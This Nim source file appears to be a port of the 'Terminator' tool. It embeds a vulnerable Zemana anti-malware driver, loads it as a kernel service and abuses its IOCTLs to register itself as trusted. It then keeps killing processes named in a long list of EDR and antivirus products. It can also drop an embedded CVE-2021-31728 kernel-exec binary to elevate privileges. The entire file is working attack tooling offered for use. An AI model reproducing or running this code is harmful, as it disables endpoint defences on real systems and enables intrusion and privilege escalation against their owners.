#[
    A port of the Terminator project to nim.
    
    Refference:
        https://github.com/ZeroMemoryEx/Terminator/blob/master/Terminator/Terminator.cpp

]#

#[
    A port of the Terminator project to nim.
    
    Refference:
        https://github.com/ZeroMemoryEx/Terminator/blob/master/Terminator/Terminator.cpp

]#

import winim/inc/[windef, winbase, tlhelp32, winsvc, winerror, winreg]
import winim/winstr
import unicode, strutils, strformat
import os
#import random

const
    IOCTL_REGISTER_PROCESS:DWORD = 0x80002010'i32
    IOCTL_TERMINATE_PROCESS:DWORD = 0x80002048'i32
    SVC_NAME: string = "zTerm"
    DEV_NAME: string = "\\\\.\\ZemanaAntiMalware"
    ZEM = slurp("2a3ce41bb2a7894d939fbd1b20dae5a0.bin") # https://www.loldrivers.io/drivers/e5f12b82-8d07-474e-9587-8c7b3714d60c/
    KERNEXEC = slurp("kernel_exec.exe") # https://github.com/irql0/CVE-2021-31728
    #CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

let EDR_LIST: seq[string] = @[
    "activeconsole", "anti malware",    "anti-malware",
    "antimalware",   "anti virus",      "anti-virus",
    "antivirus",     "appsense",        "authtap",
    "avast",         "avecto",          "canary",
    "carbonblack",   "carbon black",    "cb",
    "ciscoamp",      "cisco amp",       "countercept",
    "countertack",   "cramtray",        "crssvc",
    "crowdstrike",   "csagent",         "csfalcon",
    "csshell",       "cybereason",      "cyclorama",
    "cylance",       "cyoptics",        "cyupdate",
    "cyvera",        "cyserver",        "cytray",
    "darktrace",     "defendpoint",     "defender",
    "eectrl",        "elastic",         "endgame",
    "f-secure",      "forcepoint",      "fireeye",
    "groundling",    "GRRservic",       "inspector",
    "ivanti",        "kaspersky",       "lacuna",
    "logrhythm",     "malware",         "mandiant",
    "mcafee",        "morphisec",       "msascuil",
    "msmpeng",       "nissrv",          "omni",
    "omniagent",     "osquery",         "palo alto networks",
    "pgeposervice",  "pgsystemtray",    "privilegeguard",
    "procwall",      "protectorservic", "qradar",
    "redcloak",      "secureworks",     "securityhealthservice",
    "semlaunchsv",   "sentinel",        "sepliveupdat",
    "sisidsservice", "sisipsservice",   "sisipsutil",
    "smc",           "smcgui",          "snac64",
    "sophos",        "splunk",          "srtsp",
    "symantec",      "symcorpu",        "symefasi",
    "sysinternal",   "sysmon",          "tanium",
    "tda",           "tdawork",         "tpython",
    "vectra",        "wincollect",      "windowssensor",
    "wireshark",     "threat",          "xagt",
    "xagtnotif" ,    "mssense"];

proc NtLoadDriver (driverServiceName: PUNICODE_STRING): NTSTATUS {.stdcall, dynlib:"ntdll", importc: "NtLoadDriver".}
proc NtUnloadDriver (driverServiceName: PUNICODE_STRING): NTSTATUS {.stdcall, dynlib:"ntdll", importc: "NtUnloadDriver".}

proc enablePriv(priv:string): bool = 
    var
        hToken: HANDLE
        newtp: TOKEN_PRIVILEGES = TOKEN_PRIVILEGES()
        oldtp: TOKEN_PRIVILEGES = TOKEN_PRIVILEGES()
        luid: LUID = LUID()
        hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId())

    # Don't forget to close handles
    defer: CloseHandle(hProc)

    if hProc == cast[HANDLE](nil):
        echo "[x] Failed to open process handle"
        return false

    if 0 == OpenProcessToken(
        hProc,
        TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, # https://learn.microsoft.com/en-us/windows/win32/secauthz/access-rights-for-access-token-objects
        addr hToken):
            echo "[x] Failed to open the process token of the parent process"
            return false
    
    defer: CloseHandle(hToken)

    if 0 == LookupPrivilegeValue(
        NULL,            # lookup privilege on local system
        cast[LPCWSTR](addr newWideCString(priv)[0]),   # privilege to lookup 
        addr luid):      # receives LUID of privilege
            echo "[x] LookupPrivilegeValue failed for " & priv
            return false


    newtp.PrivilegeCount = 1
    newtp.Privileges[0].Luid = luid
    newtp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED # enable the priv


    var sOldtp: DWORD = (DWORD)sizeof(TOKEN_PRIVILEGES)

    if 0 == AdjustTokenPrivileges(
        hToken,
        FALSE,
        addr newtp,
        (DWORD)sizeof(TOKEN_PRIVILEGES),
        addr oldtp,
        addr sOldtp):
            echo "[x] AdjustTokenPrivileges error: ", GetLastError()
            echo "[x] sOldtp = ", sOldtp
            return false

    var err = GetLastError()
    if ERROR_SUCCESS == err:
        echo "[*] Enabled " & priv
        return true
    elif ERROR_NOT_ALL_ASSIGNED == err:
        echo "[x] Failed to enable " & priv
        return false

proc loadDriverService(driverPath: wstring): bool =
    var
        hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)
        hService = OpenService(hSCM, cast[LPCWSTR](addr newWideCString(SVC_NAME)[0]), SERVICE_ALL_ACCESS)
    
    # Check if the service already exists
    if hService != cast[HANDLE](NULL):
        echo "[-] Service already exists"
        var svcStatus: SERVICE_STATUS
        if not bool(QueryServiceStatus(hService, addr svcStatus)):
            CloseServiceHandle(hService)
            CloseServiceHandle(hSCM)
            echo "[x] Failed to query service"
            return false
        if svcStatus.dwCurrentState == SERVICE_STOPPED:
            if not bool(StartService(hService, 0, NULL)):
                CloseServiceHandle(hService)
                CloseServiceHandle(hSCM)
                echo "[x] Failed to start service"
                return false
            echo "[*] Starting service"
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return true

    # Create the service
    hService = CreateService(
        hSCM,
        cast[LPCWSTR](addr newWideCString(SVC_NAME)[0]),
        cast[LPCWSTR](addr newWideCString(SVC_NAME)[0]),
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        cast[LPCWSTR](addr newWideCString(driverPath)[0]),
        NULL, NULL, NULL, NULL, NULL)
    
    if hService == cast[HANDLE](NULL):
        CloseServiceHandle(hSCM)
        echo "[x] Failed to create service"
        return false

    echo "[*] Service created"

    if not bool(StartService(hService, 0, NULL)):
        CloseServiceHandle(hService)
        CloseServiceHandle(hSCM)
        echo "[x] Failed to start service"
        return false
    echo "[*] Starting service"
    CloseServiceHandle(hService)
    CloseServiceHandle(hSCM)
    return true

proc loadDriverNT(driverPath: wstring): bool =
    var
        ntStatus: NTSTATUS
        usRegPath: UNICODE_STRING
        svcImgPath: string = r"\??\" & $driverPath # IDK what the fuck the `\??\` does but its needed and took me 3 hours to figure out
        #svcImgPath: string = r"\??\C:\Windows\System32\drivers\zim.sys"

    var
        errorCode: ULONG
        subKey = &"System\\CurrentControlSet\\Services\\{SVC_NAME}"
        #subKey = &"System\\CurrentControlSet\\Services\\{SVC_NAME}"
        pathSourceReg = &"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\{SVC_NAME}"
        hkey = HKEY_LOCAL_MACHINE
        hkResult: HKEY
        disposition: DWORD = 0
        svcType: DWORD = SERVICE_KERNEL_DRIVER

    errorCode = RegCreateKeyEx(hkey, # A handle to an open registry key.
                               cast[LPWSTR](addr newWideCString(subKey)[0]), # The name of a subkey that this function opens or creates. 
                               0.DWORD, # This parameter is reserved and must be zero.
                               NULL, # The user-defined class type of this key. This parameter may be ignored. This parameter can be NULL.
                               0.DWORD, # REG_OPTION_NON_VOLATILE
                               KEY_ALL_ACCESS, # A mask that specifies the access rights for the key to be created.
                               NULL, # If lpSecurityAttributes is NULL, the key gets a default security descriptor. 
                               addr hkResult, # A pointer to a variable that receives a handle to the opened or created key. 
                               addr disposition # A pointer to a variable that receives one of the following disposition values.
                               )
    if not NT_SUCCESS(errorCode):
        echo "[x] Failed to open registry key"
        return false
    if disposition.int == 0:
        echo "[*] RegKey opened"
    elif disposition.int == 1:
        echo "[*] RegKey created"
    
    echo "[-] svcImgPath: " & svcImgPath
    echo "[-] svcImgPath Size: " & $newWideCString(svcImgPath).len
    errorCode = RegSetValueEx(hkResult,
                              cast[LPCWSTR](addr newWideCString("ImagePath")[0]),
                              0.DWORD,
                              REG_EXPAND_SZ,
                              cast[ptr BYTE](addr newWideCString(svcImgPath)[0]),
                              (sizeof(WCHAR) * newWideCString(svcImgPath).len).DWORD
                              )
    if not NT_SUCCESS(errorCode):
        echo "[x] Failed to write ImagePath to registry"
        return false


    errorCode = RegSetValueEx(hkResult,
                              cast[LPCWSTR](addr newWideCString("DisplayName")[0]),
                              0.DWORD,
                              REG_EXPAND_SZ,
                              cast[ptr BYTE](addr newWideCString(SVC_NAME)[0]),
                              (sizeof(WCHAR) * newWideCString(SVC_NAME).len).DWORD
                              )
    if not NT_SUCCESS(errorCode):
        echo "[x] Failed to write DisplayName to registry"
        return false
    

    errorCode = RegSetValueEx(hkResult,
                              cast[LPCWSTR](addr newWideCString("Type")[0]),
                              0.DWORD,
                              REG_DWORD,
                              cast[ptr BYTE](addr svcType),
                              sizeof(DWORD).DWORD
                              )
    if not NT_SUCCESS(errorCode):
        echo "[x] Failed to write Type to registry"
        return false

    svcType = 1.DWORD
    errorCode = RegSetValueEx(hkResult,
                              cast[LPCWSTR](addr newWideCString("ErrorControl")[0]),
                              0.DWORD,
                              REG_DWORD,
                              cast[ptr BYTE](addr svcType),
                              sizeof(DWORD).DWORD
                              )
    if not NT_SUCCESS(errorCode):
        echo "[x] Failed to write Driver ErrorControl to registry"
        return false

    svcType = 3.DWORD
    errorCode = RegSetValueEx(hkResult,
                              cast[LPCWSTR](addr newWideCString("Start")[0]),
                              0.DWORD,
                              REG_DWORD,
                              cast[ptr BYTE](addr svcType),
                              sizeof(DWORD).DWORD
                              )
    if not NT_SUCCESS(errorCode):
        echo "[x] Failed to write Driver Start to registry"
        return false

    RegCloseKey(hkResult)


    RtlInitUnicodeString(addr usRegPath, cast[PCWSTR](addr(newWideCString(pathSourceReg)[0])))
    ntStatus = NtLoadDriver(addr usRegPath)
    if NT_SUCCESS(ntStatus):
        echo "[*] Loaded driver!"
    else:
        echo &"[x] Failed to load driver: {cast[uint32](ntStatus):#x}"
        return false
    return true

proc checkEDRProcesses(hDevice: HANDLE): bool =
    var
        pOutbuff:uint
        bytesRet: DWORD
        hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)

    if hSnap == INVALID_HANDLE_VALUE:
        echo "[x] Failed to create toolhelp32snapshot"
        return false
    
    var procEntry: PROCESSENTRY32; procEntry.dwSize = DWORD(sizeof(PROCESSENTRY32))
    var
        bContinue = Process32First(hSnap, addr procEntry)
        pid: DWORD

    while(bool(bContinue)):
        # Build a nim string, this is probably more expensive then it needs to be but oh well I dropped out of CS lol
        var i = 0
        var exeName = ""
        while true:
            if char(procEntry.szExeFile[i]) == cast[char](nil): break
            exeName = exeName & $char(procEntry.szExeFile[i])
            i += 1
        exeName = exeName.toLower()
        exeName = exeName.replace(".exe")
        # String compare
        if exeName in EDR_LIST:
            pid = procEntry.th32ProcessID
            if bool(DeviceIoControl(
                    hDevice,
                    IOCTL_TERMINATE_PROCESS,
                    addr pid,
                    sizeof(pid).DWORD,
                    addr pOutbuff,
                    sizeof(pOutbuff).DWORD,
                    addr bytesRet,
                    NULL)):
                        echo "[!] Terminated ", $exeName
            else:
                echo "[x] Failed to terminate ", $exeName

        if not bool(Process32Next(hSnap, addr procEntry)):
            bContinue = FALSE

    CloseHandle(hSnap)
    return true

# signal stuff
type
  TSignal = enum
    SIGINT = 2
    SIGSomething3 # avoiding enum with holes
    SIGSomething4
    SIGSomething5
    SIGSomething6
    SIGSomething7
    SIGFPE

proc signal*(sig: cint, fn: pointer) {.importc: "signal", header: "<signal.h>".}

template atSignal*(s: TSignal, actions: untyped): untyped =
  proc callback(sig: cint) =
    actions
  signal(cint(s), callback)

# Hit Ctrl+C to kill the run
when isMainModule:
    # Write the driver to disk with a random name
    #randomize()
    #var zName = genRandString(rand(3..13)) & ".sys"
    var zName = "zim.sys"
    
    # enable SeLoadDriverPrivilege
    if not enablePriv(SE_LOAD_DRIVER_NAME):
        quit(0)

    echo "[?] Drop kern exec for a go at system? [y/n]"
    var k = readLine(stdin)[0]

    echo "[?] Use NtLoadDriver? (otherwise use sc manager) [y/n]"
    var nt = readLine(stdin)[0]

    # write vuln driver to disk
    writeFile(zName, ZEM)

    var
        fileData: WIN32_FIND_DATA
        fullDriverPath: array[MAX_PATH, WCHAR]
        hFind = FindFirstFile(cast[LPCWSTR](addr newWideCString(zName)[0]), addr fileData)
        sFullDriverPath = ""
    
    if hFind == INVALID_HANDLE_VALUE: # file is not found
        echo "[x] Could not find driver on disk"
        quit(0)
    echo "[-] Found driver"
    
    if 0 != GetFullPathName(addr filedata.cFileName[0], MAX_PATH, addr fullDriverPath[0], NULL):
        var i = 0
        while true:
            if char(fullDriverPath[i]) == cast[char](nil): break
            sFullDriverPath = sFullDriverPath & $char(fullDriverPath[i])
            i += 1
        echo "[-] Driver path is ", sFullDriverPath
    else: echo "[x] Driver path not found"; quit(0)

    echo "[-] Loading driver..."
    
    if nt.toLowerAscii() == 'y':
        if not loadDriverNT(+$sFullDriverPath):
            echo "[x] Failed to load driver"
            quit(0)
    else:
        if not loadDriverService(+$sFullDriverPath):
            echo "[x] Failed to load driver"
            quit(0)
    
    echo "[*] Loaded driver"

    var hDevice = CreateFile(
        cast[LPCWSTR](addr newWideCString(DEV_NAME)[0]),
        GENERIC_WRITE or GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        cast[HANDLE](NULL))
    
    if hDevice == cast[HANDLE](NULL):
        echo "[x] Failed to open handle to driver"
        quit(0)
    
    # Register proc in trusted list
    var pid = GetCurrentProcessId()
    if  bool(DeviceIoControl(
        hDevice,
        IOCTL_REGISTER_PROCESS,
        addr pid,
        DWORD.sizeof.DWORD, # nim is silly
        NULL,
        0,
        NULL,
        NULL)):
            echo "[*] Process registered in trusted list"
    else:
        echo "[x] Failed to register process in trusted list"
        CloseHandle(hDevice)
        quit(0)

    echo "[*] Terminating EDR/XDR/AVs. Keep the program running to prevent windows service from restarting them..."
    
    discard checkEDRProcesses(hDevice)

    if k.toLowerAscii() == 'y':
        writeFile("31728.exe", KERNEXEC)
        echo "[*] Dropped 31728.exe - run to elevate!"

    # Clean up on ctr-c
    atSignal(SIGINT):
        echo("\n[*] Cleaning up...")
        CloseHandle(hDevice)
        if(nt.toLowerAscii() == 'y'):
            var
                usRegPath: UNICODE_STRING
                pathSourceReg = &"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\{SVC_NAME}"
            RtlInitUnicodeString(addr usRegPath, cast[PCWSTR](addr(newWideCString(pathSourceReg)[0])))
            var ntStatus = NtUnloadDriver(addr usRegPath)
            if not NT_SUCCESS(ntStatus):
                echo  &"[x] Failed to unload driver: {cast[uint32](ntStatus):#x}"
                quit(0)
            if not DeleteFile(cast[LPCWSTR](addr(newWideCString(sFullDriverPath)[0]))).bool:
                echo "[x] Failed to delete the driver file!"
                quit(0)
            echo "[!] Not deleting registry keys cause I'm lazy!"
            quit(0)
        else:
            var
                hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)
                hService = OpenService(hSCM, cast[LPCWSTR](addr newWideCString(SVC_NAME)[0]), SERVICE_ALL_ACCESS)
                srvStatus: SERVICE_STATUS
            if not ControlService(hService, SERVICE_STOP, addr srvStatus).bool:
                echo "[x] Failed to stop service!"
                quit(0)
            if not DeleteService(hService).bool:
                echo "[x] Failed to delete service!"
                quit(0)

    
    while true:
        if not checkEDRProcesses(hDevice):
            sleep(1200)
        else:
            sleep(700)

    CloseHandle(hDevice)